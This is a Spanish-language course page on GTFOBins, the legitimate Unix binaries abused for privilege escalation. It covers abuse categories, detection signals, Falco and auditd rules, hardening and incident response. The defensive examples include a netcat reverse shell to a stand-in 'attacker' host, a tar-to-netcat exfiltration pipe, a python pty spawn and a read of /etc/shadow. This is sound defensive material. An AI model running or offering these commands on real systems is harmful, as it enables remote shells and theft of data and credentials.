| **Inicio**         | **atrás 25**            | **Siguiente 27**         |
| ------------------ | ----------------------- | ------------------------ |
| [🏠](../README.md) | [⏪](./13_25_LOLBAS.md) | [⏩](./13_27_WADCOMS.md) |

---

## **Índice**

| Temario                                                                                                                                                   |
| --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| [461. GTFOBINS](#461-gtfobins)                                                                                                                            |
| [462. Dominando la escalada de privilegios: una guía completa sobre GTFOBins](#462-dominando-la-escalada-de-privilegios-una-guía-completa-sobre-gtfobins) |

# **GTFOBINS**

## **461. GTFOBINS**

### ¿Qué es GTFOBins?

**GTFOBins** es un repositorio público (comunidad) que documenta **binarios de Unix/Linux que pueden ser abusados** para realizar acciones sensibles sin necesidad de subir malware: escalado de privilegios, ejecución remota de código, lectura/escritura de archivos, mover ficheros fuera del sistema, creación de una shell, port forwarding, etc.
Son el análogo Linux de LOLBAS: utilidades **legítimas** instaladas por defecto o por paquetes (parte del sistema o software tercero) que un atacante puede encadenar para lograr objetivos maliciosos.

Importante: GTFOBins es una **lista de técnicas** de doble uso. Su propósito legítimo es **ayudar a defensores** a conocer vectores de abuso y a hardenizar sistemas; no es una “receta” de ataque.

### ¿Por qué importan los GTFOBins?

- Porque permiten _vivir del propio sistema_: el atacante evita introducir binarios nuevos y reduce la telemetría sospechosa.
- Muchos binarios tienen capacidades poderosas (abrir sockets, interpretar scripts, ejecutar comandos con privilegios distintos, aprovechar SUID/SGID).
- Afectan entornos donde se confía en la integridad de las utilidades estándar o donde hay muchos binarios instalados (containers, servidores, estaciones de trabajo).

### Categorías típicas de abuso (con ejemplos representativos)

Voy a listar categorías útiles para defensa con ejemplos de binarios normalmente documentados en GTFOBins. Para cada uno doy _qué puede hacer_ y _qué señales_ deja.

1. **Obtener una shell / ejecución de comandos**

   - Ejemplos: `python`, `perl`, `ruby`, `awk`, `sed`, `nc` (netcat), `sh` embebido en otras utilidades.
   - Riesgo: convertir un RCE (comando aislado) en shell interactiva.
   - Señales: procesos hijos inusuales de servicios, conexiones interactivas salientes, procesos con TTY pseudoasignado en tiempos extraños.

2. **Escalada de privilegios vía SUID/SGID**

   - Ejemplos: binarios con bit SUID mal configurados (p. ej. `vim`/`nvim` o `less` en sistemas antiguos, `find`/`cp` abuse en ciertos contextos).
   - Riesgo: ejecutar código como root si binario SUID permite editar archivos o lanzar shell.
   - Señales: ejecuciones de binarios SUID por cuentas no esperadas, cambios en bit SUID.

3. **Transferencia de archivos (ingress/egress)**

   - Ejemplos: `curl`, `wget`, `scp`, `nc`, `ftp`, `rsync`.
   - Riesgo: traer herramientas, exfiltrar datos.
   - Señales: conexiones HTTP/FTP/SSH salientes desde hosts inusuales, `wget` o `curl` ejecutados por procesos que no suelen descargar.

4. **Evasión / ejecución “fileless”**

   - Ejemplos: `perl`/`python -c '...'`, `bash -c`, `sh -c`, `xargs` con payload, `env` abusing.
   - Riesgo: ejecutar código en memoria sin escritura a disco; menos artefactos en FS.
   - Señales: procesos con líneas de comando largas y Base64, ausencia de fichero ejecutable correspondiente.

5. **Lectura/escritura de ficheros protegidos**

   - Ejemplos: `less`, `more`, `strings`, `tar` (extraer archivos), `gdb` (en ciertos entornos), `sudoedit` (si mal usado).
   - Riesgo: robar claves, tokens, credenciales.
   - Señales: lectura de ficheros sensibles (`/etc/shadow`, `/root`) por procesos no habituales.

6. **Networking / port forwarding / bind shells**

   - Ejemplos: `socat`, `nc`, `ssh` (reverse tunnels), `python -m http.server`.
   - Riesgo: pivot, túneles hacia C2.
   - Señales: listeners en puertos no usados, túneles ssh reversos con cuentas no esperadas, procesos `python`/`socat` corriendo con conexiones persistentes.

7. **Persistencia**

   - Ejemplos: ediciones de crontab (`crontab -e`), `systemctl --user` (unidades de user), modificación de scripts de init, `at`, `.bashrc` persistentes.
   - Riesgo: volver tras reinicio.
   - Señales: entradas de cron nuevas, units `systemd` sospechosas, cambios en archivos de perfil.

8. **Bypass de controles**

   - Ejemplos: `ld.so` preload tricks con `LD_PRELOAD`, `strace`/`ltrace` para investigar procesos.
   - Riesgo: evadir detección o manipular librerías cargadas.
   - Señales: variables de entorno sospechosas en servicios, procesos iniciados con LD_PRELOAD.

### Ejemplos concretos (enfoque defensivo — qué observar)

> Nota: no doy “pasos de explotación” sino patrones y señales para detección.

- **`python -c 'import pty; pty.spawn("/bin/sh")'`**

  - Señal defensiva: proceso `python` con argumentos `-c` que tiene un TTY, spawn a `/bin/sh`. Correlacionar con proceso padre (p. ej. `nginx` no debería lanzar `python` así).

- **`nc -e /bin/sh attacker:4444`** (netcat con ejecución)

  - Señal: `nc` con flag `-e` o `-c` y conexión saliente persistente. Netcat raramente usado con `-e` en servidores de producción.

- **`/usr/bin/less /etc/shadow`** cuando `less` es invocado por usuario sin permiso directo

  - Señal: acceso a ficheros sensibles con binarios que pueden ser usados para leer archivos privilegiados (auditar quien lanzó `less` y por qué).

- **`tar -cf - /sensitive | nc attacker 9000`** (exfiltración por pipe)

  - Señal: proceso `tar` piping a netcat, conexiones salientes tras lectura de rutas críticas.

### Detección y hunting — consultas y reglas útiles

#### 1) Auditd (Linux) — reglas recomendadas (concepto)

- Auditar ejecución de binarios sensibles (lista blanca/negra): `auditctl -a always,exit -F path=/usr/bin/wget -F perm=x -k suspicious_downloads`
- Auditar cambios en crontabs, systemd units, SUID bit changes: monitor `chmod` on SUID files and writes to `/etc/cron*` and `/etc/systemd/system`.

> Recomendación: no auditar TODO sin plan; en entornos con alta carga, priorizar binarios de alto riesgo y SUID.

#### 2) Falco rules (ejemplos conceptuales)

- Detectar ejecución de `curl/wget` por procesos padre no expected:

```yaml
- rule: Suspicious Curl Invocation From Non-Shell
  desc: Detect curl invoked from unusual parent process
  condition: evt.type = execve and proc.name = "curl" and not proc.pname in ("bash","sh","systemd")
  output: "curl launched by %proc.pname (user=%user.name cmd=%proc.cmdline)"
  priority: WARNING
```

- Detectar creación de crontab por usuario no autorizado:

```yaml
- rule: Cronfile Modified
  condition: write_file and fd.name startswith "/etc/cron"
  output: "cron file modified: %fd.name by %user.name"
  priority: CRITICAL
```

#### 3) Syslog / EDR correlation ideas

- Correlación: `ProcessCreate` (curl/wget/nc/python) + `NetworkConnect` (to external IP) + `FileCreate` (temp/\*.exe or /tmp/tarball) → alta prioridad.
- Alertar cuando procesos con capacidad de spawn shell (python/perl/ruby) son lanzados por servicios de red (nginx, tomcat) o por usuarios no dev.

#### 4) Hunting queries (Elastic/Splunk conceptual)

- Buscar `proc.name: "wget" and parent.name: NOT IN ("bash","sh","root-shell")`
- Buscar `proc.cmdline: ("-c" AND "python")` o `proc.cmdline: ("python -c" AND "pty")`

### Mitigaciones y controles (priorizados)

1. **Principio de mínimo privilegio**

   - Evitar dar SUID/SGID innecesario. Revisar y remover bits SUID no justificados.

2. **Hardening de imágenes / containers**

   - Construir imágenes mínimas que no contengan herramientas innecesarias (`python`, `perl`, `socat`, `netcat`) si no se usan. Menos herramientas = menos superficie GTFOBins.

3. **Control de ejecución / App Control**

   - AppArmor/SELinux, AppArmor profiles y policy, **AppArmor** restrictivo para procesos de red; **WDAC**/AppLocker en Windows (equivalente).
   - Block/allow execution by path/signature para binarios de alto riesgo en endpoints sensibles.

4. **Monitorización y logging**

   - Habilitar `auditd`, Sysmon-Linux (si procede), PowerShell logging en Windows, y forward a SIEM.
   - Registrar argumentos de línea de comando completos y parent process.

5. **Network egress control**

   - Forzar tráfico saliente por proxy que registre y bloquee destinos no autorizados; IPS/Firewall egress rules.

6. **Eliminar/limitar utilidades en imágenes de producción**

   - En containers: usar distros “distroless” o imágenes reducidas; en VMs, gestionar packages instalados.

7. **Protección de secretos**

   - No almacenar credenciales en archivos en texto. Usar vaults y restringir accesos. Menos secretos en FS = menor recompensa por lectura.

8. **Políticas de auditoría de SUID**

   - Alertas si un archivo cambia a SUID o si un usuario no autorizado ejecuta SUID binaries.

9. **Emular Red Team controlado**

   - Hacer ejercicios controlados para validar detección de GTFOBins y ajustar reglas.

### Respuesta a incidentes — pasos rápidos cuando detectas posible abuso GTFOBins

1. **Aislar host** (si es crítico).
2. **Recolectar evidencia**: `ps axf`, `/proc/<pid>/cmdline`, auditd logs, lsof, logs de red (pcap/cloud proxy).
3. **Identificar la cadena**: parent→child, qué binarios se usaron, qué archivos se accedieron/crearon, conexiones salientes.
4. **Hunting lateral**: buscar mismos IOC/commandline en otros hosts.
5. **Contener y remediar**: detener procesos maliciosos, bloquear dominios/IP, revertir cambios persistentes (cron/systemd), rotar credenciales comprometidas.
6. **Post-mortem**: añadir reglas de detección, cerrar huecos (remover SUID, endurecer imágenes).

### Qué deben hacer Red/Blue teams e investigadores

- **Red Team**: usar GTFOBins de manera responsable en entornos de prueba para medir visibilidad y respuesta; documentar qué detecciones fallaron.
- **Blue Team**: priorizar detección de binarios de alto riesgo, instrumentar logging (auditd/Falco/Sysmon), y reducir la disponibilidad de utilidades innecesarias.
- **Investigadores**: contribuir observables y TTPs, mantener inventario local de GTFOBins en la infra y compartir reglas de detección.

### Recursos prácticos y sugeridos (qué crear/entregar ahora)

Puedo prepararte ya cualquiera de estos artefactos listos para usar:

- Tabla mapeada (binario → tipo de abuso → indicadores → mitigación) para imprimir o incluir en playbooks.
- Reglas **Falco** y extractos **auditd** adaptados a tu entorno (lista de binarios críticos que me indiques).
- Checklist para hardening de imágenes/container que reduzca superficie GTFOBins.
- Playbook de respuesta a incidente con pasos y comandos de recolección de evidencia (enfocado a defensa).

Dime cuál quieres y lo genero ahora mismo (por ejemplo: la tabla mapeada con 30 binarios comunes y sus mitigaciones).

---

[🔼](#índice)

---

## **462. Dominando la escalada de privilegios: una guía completa sobre GTFOBins**

### 1 — Concepto: ¿por qué GTFOBins facilitan la escalada de privilegios?

Los **GTFOBins** son utilidades legítimas del sistema que, por sus capacidades o por cómo están configuradas en el sistema (por ejemplo con bit **SUID**), permiten a un atacante **elevar privilegios** (obtener shell root, leer ficheros protegidos, ejecutar binarios con mayor privilegio) sin subir binarios externos.
Razones principales:

- Muchos binarios admiten opciones o comportamientos (scripting, apertura de editor, ejecución de comandos) que pueden ser encadenados para alcanzar objetivos privilegiados.
- SUID/SGID mal configurados proporcionan ejecución con privilegios elevados.
- Contenedores e imágenes grandes contienen utilidades innecesarias que amplían la superficie de ataque.

### 2 — Vectores comunes de escalada con GTFOBins (resumen)

1. **SUID/SGID binaries**: ejecutables con bit SUID ejecutan con el UID del propietario (a menudo root).
2. **Ejecución de intérpretes**: `python`, `perl`, `ruby`, `bash` usados para obtener shells con mayor contexto.
3. **Editores y visores**: `less`, `vim`, `nano` que permiten editar/ejecutar comandos desde una sesión privilegiada.
4. **Ejecutores de procesos mediante setuid utilities**: binarios que permiten ejecutar otros comandos o abrir subshells.
5. **Herramientas con capacidades de file I/O**: `tar`, `cpio`, `rsync` que, si son ejecutadas con privilegios, permiten crear/extraer archivos con permisos elevados.
6. **Servicios con ficheros de configuración escribibles**: si un servicio root carga una config modificable por un usuario, ese usuario puede inyectar instrucciones.
7. **Tareas programadas (cron/at)**: escribir en crontab o modificar scripts que ejecute root.
8. **Capacidades POSIX / Linux capabilities**: binarios con capacidades especiales (`cap_net_raw`, `cap_sys_admin`) que permiten acciones privilegiadas sin ser UID 0.
9. **Sistemas SUID vía binaries no esperados** (p. ej. versiones antiguas de `find`, `nawk`, `less`).

### 3 — Escenarios típicos (con ejemplos conceptuales — defensivos)

> Nota: uso descripciones conceptuales, no comandos exploitativos.

- **Escenario A — SUID en un binario inesperado**

  _Situación:_ `binaryX` tiene SUID root pero su funcionalidad permite abrir un editor o ejecutar una shell internamente.

  _Riesgo:_ un usuario normal ejecuta `binaryX` y obtiene código con privilegios root.

  _Defensa:_ eliminar bit SUID si no es necesario; auditar SUID regularmente.

- **Escenario B — Servicio root lee fichero de configuración escribible por usuario**

  _Situación:_ servicioD (ejecutado como root) carga `/etc/serviceD/conf.d/*.conf` y archivos en esa ruta son editables por grupo `developers`.

  _Riesgo:_ un usuario con permiso para escribir crea una entrada que hace ejecutar un binario con privilegios.

  _Defensa:_ restringir permisos, usar owner root\:root y permisos 0640; validar integridad.

- **Escenario C — Utilidad ‘editor’ disponible en SUID o dentro de contenedor**

  _Situación:_ contenedor incluye `vim`/`python` y usuario puede abrir shell desde allí.

  _Riesgo:_ escapar a funciones del sistema o pivotar.

  _Defensa:_ imágenes mínimas (distroless), remover intérpretes y utilidades no necesarias.

- **Escenario D — Cron o systemd units modificables por usuario**

  _Situación:_ directorio donde root carga unidades o cron tiene permissive group write.

  _Riesgo:_ persistencia y escalada tras reinicio.

  _Defensa:_ asegurar owner/perms, auditar cambios.

### 4 — Señales / artefactos para detección (qué buscar)

Prioriza correlaciones padre→hijo, accesos a ficheros sensibles y cambios en metadata:

- **Ejecuciones SUID por usuarios no esperados** — alerta si un binario SUID es lanzado por una cuenta normal fuera de horarios/hosts esperados.
- **Creación/edición de ficheros en directorios sensibles** (`/etc/systemd`, `/etc/cron.*`, `/usr/local/sbin`) por usuarios no root.
- **Invocaciones de intérpretes desde servicios de red** (p. ej. `nginx` lanzando `python` o `perl`).
- **Aparición de procesos con TTY o pty spawn** asociados a intérpretes que no deben crear shells interactivas.
- **Cambios en bit SUID/SGID** o en permisos de ficheros críticos.
- **Lecturas de ficheros sensibles** (`/etc/shadow`, directorios home de admins) por procesos no autorizados.
- **Creación de crons o systemd unit files recientemente** seguidos de ejecución.

### 5 — Herramientas y reglas defensivas (audit, Falco, SIEM)

A continuación propondré reglas conceptuales y ejemplos de detección que puedes adaptar.

### Auditd (Linux) — reglas recomendadas (ejemplos conceptuales)

- Auditar ejecución de binarios SUID/SGID:

  - Regla: monitorizar `execve` para rutas listadas en SUID inventory.

- Auditar writes a `/etc/cron*` y `/etc/systemd/system`:

  - Regla: watch write events en esos paths con key `cron_write/systemd_write`.

> Implementar con cuidado: en entornos con alta carga, priorizar listas blancas/negativas para evitar ruido.

### Falco — reglas conceptuales

- **Alerta** cuando `process.name` ejecuta un binario en la lista SUID y el `user` no es root.
- **Alerta** cuando un archivo dentro de `/etc/systemd/system` es creado/modificado por un usuario no root.
- **Alerta** cuando un intérprete (`python`, `perl`, `ruby`, `bash`) es lanzado por un proceso de servicio web.

### SIEM / Correlación (ideas)

- Correlación: `file_write(/etc/cron*)` + `process_create(unknown_interpreter)` → prioridad alta.
- Buscar patrones de `parent_process=serviceX` + `child_process=interpreter` + `network_outbound` → posible pivot/escalada.

### 6 — Hardening y mitigaciones efectivas (prioridad práctica)

1. **Inventario y eliminación de SUID innecesarios**

   - Inventario de todos los SUID/SGID en sistemas; justificar cada uno; remover los que no son esenciales.

2. **Principio de mínimo privilegio para ficheros y directorios**

   - Configs y unidades: owner `root:root`, perms restrictivas (`0640`/`0600`).
   - Evitar dar write a usuarios no administradores.

3. **Imágenes y contenedores minimalistas**

   - Quitar intérpretes y utilidades no requeridas. Usar imágenes distroless.

4. **Control de ejecución**

   - En Linux: AppArmor/SELinux profiles restrictivos.
   - En infra crítica: usar mecanismos de whitelisting de ejecución.

5. **Políticas de sudo seguras**

   - Evitar reglas `NOPASSWD: ALL` y comandos wildcard en sudoers. Reducir comandos permitidos a lo estrictamente necesario. Monitorear entradas sudoers.

6. **Auditoría y alertas en cambios de permisos/SUID/cron/systemd**

   - Alertar y bloquear cambios no autorizados.

7. **Gestionar capacidades Linux**

   - Revisar binarios con capabilities; retirar capacidades innecesarias.

8. **Revisión de servicios**

   - Asegurar que servicios no ejecuten comandos con derechos de usuario ajustables. Validar rutas de carga de configuración.

9. **Egress control y proxying**

   - Restringir descargas directas desde endpoints, forzar proxys que inspeccionen y controlen descargas.

10. **Secrets y credenciales**

    - No almacenar credenciales en ficheros legibles por servicios o usuarios; usar vaults.

### 7 — Hunting práctico (consultas y workflows)

1. **Inventario inicial**

   - Listar SUID/SGID files, revisar su justificación.
   - Inventario de intérpretes y utilidades instaladas en hosts críticos.

2. **Búsqueda de anomalías**

   - Buscar ejecuciones de intérpretes con procesos padres sospechosos (web servers, servicios que no deberían spawnear shells).
   - Buscar escrituras en rutas de config por usuarios no root.

3. **Hunting distribuido**

   - Usar EDR para pivotar por matching de commandlines o hashes.
   - Buscar patrones temporales (e.g., cambios justo antes de horario de mantenimiento).

4. **Validación**

   - Reproducir detección en entorno controlado (lab) con Red Team para calibrar falsos positivos.

### 8 — Ejercicios y practicas para equipos (Red/Blue)

- **Blue Team**: simular detecciones con ejecuciones controladas (lab) para verificar que reglas Falco/audit/SIEM disparan y que playbooks de respuesta funcionan.
- **Red Team**: en entorno autorizado, intentar escalada usando únicamente utilidades del sistema (sin subir binarios) para identificar gaps de detección y mejorar controles.
- **Post-mortem**: cada ejercicio debe terminar en POA\&M con acciones concretas (remover SUID, fortalecer sudoers, crear reglas).

### 9 — Checklist operativo rápido (priorizar acciones)

1. Hacer inventario SUID/SGID → justificar y eliminar lo innecesario.
2. Revisar permisos en `/etc` y directorios de servicios → asegurar owner root.
3. Harden imágenes/containers → eliminar interpretes y utilidades no necesarias.
4. Implementar AppArmor/SELinux profiles para servicios web y DB.
5. Habilitar auditd / Falco + forwarding a SIEM; crear reglas de alerta base.
6. Revisar y endurecer sudoers; evitar NOPASSWD genéricos.
7. Implementar Egress control y bloqueo de descargas arbitrarias.
8. Automatizar scans de SUID/perms y generar alertas en cambios.

---

[🔼](#índice)

---

| **Inicio**         | **atrás 25**            | **Siguiente 27**         |
| ------------------ | ----------------------- | ------------------------ |
| [🏠](../README.md) | [⏪](./13_25_LOLBAS.md) | [⏩](./13_27_WADCOMS.md) |
